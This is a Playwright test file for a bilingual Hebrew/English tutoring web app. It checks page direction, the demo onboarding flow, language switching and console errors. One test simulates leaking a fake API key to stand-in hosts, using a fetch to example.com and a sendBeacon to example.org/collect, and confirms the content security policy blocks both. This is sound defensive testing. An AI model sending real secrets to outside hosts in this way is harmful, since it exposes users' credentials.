import { expect, test } from "@playwright/test";

test("loads in Hebrew RTL with no console errors", async ({ page }) => {
  const errors: string[] = [];
  page.on("pageerror", (e) => errors.push(e.message));
  page.on("console", (m) => m.type() === "error" && errors.push(m.text()));
  await page.goto("/");
  await expect(page.locator("html")).toHaveAttribute("dir", "rtl");
  await expect(page.getByRole("heading", { name: "TutorAI" })).toBeVisible();
  await page.getByRole("button", { name: "בואו נתחיל" }).click();
  await page.getByText("בתוך הדפדפן").click();
  await page.getByRole("combobox", { name: "איזה חשבון AI יש לכם?" }).click();
  await page.getByRole("option", { name: /רק לנסות/ }).click();
  await page.getByRole("button", { name: "כניסה במצב הדגמה" }).click();
  await page.getByRole("button", { name: "קורס לדוגמה: הסתברות" }).click();
  await expect(page.getByRole("heading", { name: "הסתברות למדעי המחשב" })).toBeVisible();
  const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
  expect(overflow).toBeLessThanOrEqual(1);
  expect(errors).toEqual([]);
});

test.describe("English", () => {
  test.use({ locale: "en-US" });
  test("loads in English LTR, switches to Hebrew, no console errors", async ({ page }) => {
    const errors: string[] = [];
    page.on("pageerror", (e) => errors.push(e.message));
    page.on("console", (m) => m.type() === "error" && errors.push(m.text()));
    await page.goto("/");
    await expect(page.locator("html")).toHaveAttribute("dir", "ltr");
    await expect(page.locator("html")).toHaveAttribute("lang", "en");
    await page.getByRole("button", { name: "Let's get started" }).click();
    await page.getByRole("button", { name: /browser/i }).first().click();
    await page.getByRole("combobox", { name: "Which AI account do you have?" }).click();
    await page.getByRole("option", { name: /Just try it/ }).click();
    await page.getByRole("button", { name: "Start in demo mode" }).click();
    await page.getByRole("button", { name: /Sample course: Probability/ }).click();
    await expect(page.getByRole("navigation", { name: "Course sections" }).getByRole("link", { name: /Tools/ })).toBeVisible();
    await page.getByRole("navigation", { name: "Course sections" }).getByRole("link", { name: /Tools/ }).click();
    await expect(page.getByText("Interactive explainer")).toBeVisible();
    await page.goto(page.url().replace(/#.*$/, "#/settings"));
    await page.getByRole("button", { name: "עברית" }).click();
    await expect(page.locator("html")).toHaveAttribute("dir", "rtl");
    await expect(page.getByRole("heading", { name: "הגדרות" })).toBeVisible();
    const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    expect(overflow).toBeLessThanOrEqual(1);
    expect(errors).toEqual([]);
  });
});

test("the network policy blocks requests to any address except Anthropic and localhost", async ({ page }) => {
  await page.goto("/");
  const result = await page.evaluate(async () => {
    const violations: string[] = [];
    document.addEventListener("securitypolicyviolation", (e) => violations.push(e.blockedURI));
    const tryFetch = (url: string) => fetch(url, { mode: "no-cors" }).then(() => "sent", () => "failed");
    const outside = await tryFetch("https://example.com/?key=sk-ant-test");
    navigator.sendBeacon("https://example.org/collect", "sk-ant-test"); // queued, then blocked
    await new Promise((r) => setTimeout(r, 300));
    return { outside, violations };
  });
  expect(result.outside).toBe("failed");
  expect(result.violations.some((u) => u.includes("example.com"))).toBe(true);
  expect(result.violations.some((u) => u.includes("example.org"))).toBe(true);
  // Allowed destinations are not reported as violations.
  const allowed = await page.evaluate(async () => {
    const violations: string[] = [];
    document.addEventListener("securitypolicyviolation", (e) => violations.push(e.blockedURI));
    await fetch("https://api.anthropic.com/v1/models", { mode: "no-cors" }).catch(() => {});
    await fetch("http://localhost:11434/api/tags", { mode: "no-cors" }).catch(() => {});
    await new Promise((r) => setTimeout(r, 200));
    return violations;
  });
  expect(allowed).toEqual([]);
});
